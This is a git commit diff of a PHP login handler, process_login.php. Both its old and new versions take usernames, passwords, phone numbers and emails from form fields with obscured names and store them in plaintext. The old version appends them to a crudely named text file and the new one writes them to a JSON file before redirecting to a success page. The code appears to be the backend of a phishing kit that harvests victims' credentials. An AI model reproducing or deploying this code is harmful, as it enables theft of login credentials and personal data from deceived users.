a89e36d66170ba8544fc57c4709136a0c3ef6fb9
r00tma0 <117512386+r00tma0@users.noreply.github.com>
2023-08-10 05:12:50 +0300

    Update process_login.php

--- process_login.php
+++ process_login.php
@@ -1,14 +1,28 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST["zwous"];
-    $password = $_POST["zwoup"];
-    $phone = $_POST["zwopho"];
-    $email = $_POST["zwomai"];
-    
-    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "Phone: " . $phone . "\n" . "Email: " . $email . "\n\n";
-    
-    $file = fopen("fucked.txt", "a"); // Open the creatively named file in append mode
-    fwrite($file, $data);
-    fclose($file);
-}
+// Load existing data from JSON file
+$jsonFile = 'data.json';
+$jsonData = file_get_contents($jsonFile);
+$data = json_decode($jsonData, true);
+
+// Get form data
+$username = $_POST['zwous'];
+$password = $_POST['zwoup'];
+$phoneNumber = $_POST['zwopho'];
+$email = $_POST['zwomai'];
+
+// Add user data to the array
+$data[] = array(
+    "username" => $username,
+    "password" => $password,
+    "phoneNumber" => $phoneNumber,
+    "email" => $email
+);
+
+// Encode the updated data and save to JSON file
+$updatedJsonData = json_encode($data, JSON_PRETTY_PRINT);
+file_put_contents($jsonFile, $updatedJsonData);
+
+// Redirect to a success page
+header('Location: success_page.html');
+exit();
 ?>
